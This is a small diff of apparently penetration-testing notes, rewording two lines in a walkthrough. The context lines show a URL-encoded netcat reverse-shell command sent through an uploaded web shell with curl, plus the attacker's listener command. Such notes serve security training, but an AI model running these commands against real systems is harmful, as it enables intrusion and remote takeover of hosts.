@@ -184,14 +184,14 @@ Research your target OS fully
     ```
     https://www.urlencoder.org/
 
-    The above turns into:
+    The above nc command turns into:
     nc%20e.f.g.h%209999%20-e%20%2Fbin%2Fbash
     ```
     Execute your nc command
     ```
     curl http://a.b.c.d/uploads/webshell.php?cmd=nc%20d.e.f.g%209999%20-e%20%2Fbin%2Fbash
     ```
-    Check your shell
+    Check your listener
     ```
     nc -nvlp 9999
     listening on [any] 9999 ...
